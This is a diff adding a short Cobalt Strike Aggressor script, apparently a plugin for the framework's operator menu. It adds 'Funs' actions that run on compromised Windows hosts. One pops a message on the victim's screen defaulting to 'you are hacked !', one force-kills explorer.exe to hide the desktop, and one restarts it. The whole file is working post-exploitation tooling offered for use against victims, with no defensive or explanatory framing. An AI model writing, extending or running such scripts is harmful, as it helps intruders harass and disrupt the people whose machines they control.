@@ -1,0 +1,31 @@
+#define functions
+
+sub Send {
+        $username = replace(beacon_info($bid,"user"),' \*',"");
+        $msg = $3['msg'];
+        if(($username cmp "SYSTEM") == 0){
+            show_error("Cannot send message with SYSTEM !");
+            return;
+        }
+        bshell($bid,"msg $username \"$msg\"");
+    }
+#append menus
+
+    menu "Funs"{
+                item "Chat"{
+                    $bid = $1['@'];
+                    $dialog = dialog("Chat", %(msg => "you are hacked ! from: ".beacon_info($bid,"user"),bid => $bid), &Send);
+                    dialog_description($dialog, "Send a message to the host.");
+                    drow_text_big($dialog,"msg","Message:");
+                    dbutton_action($dialog, "Send");
+                    dialog_show($dialog);
+                }
+
+                item "Hidden Desktop"{
+                    bshell($1,"taskkill /F /IM explorer.exe");
+                }
+
+                item "Resume Desktop"{
+                    brun($1, "explorer.exe");
+                }
+            }
